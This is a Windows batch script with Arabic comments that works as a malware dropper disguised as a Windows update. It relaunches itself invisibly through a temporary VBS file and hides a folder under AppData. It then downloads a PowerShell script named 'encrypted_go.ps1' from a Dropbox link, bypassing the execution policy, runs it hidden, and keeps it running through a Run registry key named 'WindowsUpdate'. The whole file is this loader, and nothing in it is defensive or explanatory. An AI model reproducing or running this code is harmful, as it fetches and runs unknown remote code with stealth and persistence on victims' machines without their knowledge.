��
@echo off
setlocal EnableDelayedExpansion

:: إعداد المتغيرات
set "url=https://www.dropbox.com/scl/fi/4tzjckv7p19bkvbj2tfk9/encrypted_go.ps1?rlkey=1uhmrmx19sd7b4rrr9bop5sta&st=k1ne53dl&dl=1"
set "file=windo.ps1"
set "folder=%APPDATA%\Microsoft\Update"
set "fullpath=%folder%\%file%"

:: إذا كان التشغيل صامتاً انتقل مباشرة للتنفيذ
if "%~1"=="silent" goto runSilent

:: إنشاء وتشغيل ملف VBS للتشغيل الخفي
set "vbsfile=%temp%\_run_hidden.vbs"
(
    echo Set WshShell = CreateObject("WScript.Shell"^)
    echo WshShell.Run "cmd /c ""%~f0"" silent", 0, False
)>"%vbsfile%"
cscript //nologo "%vbsfile%"
del "%vbsfile%" >nul 2>&1
exit /b

:runSilent

:: إنشاء المجلد إذا لم يكن موجوداً وإخفاؤه
if not exist "%folder%" (
    mkdir "%folder%" >nul 2>&1
    attrib +h "%folder%" >nul 2>&1
)

:: تنزيل الملف باستخدام PowerShell
powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
    "try { Invoke-WebRequest -Uri '%url%' -OutFile '%fullpath%' -UseBasicParsing -ErrorAction Stop } catch { exit 1 }"

:: إذا تم تنزيل الملف بنجاح
if exist "%fullpath%" (
    :: إضافة مفتاح الريجستري للتشغيل التلقائي
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "\"powershell\" -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%fullpath%\"" /f
    
    :: تشغيل الملف حالياً
    powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%fullpath%"
)

exit /b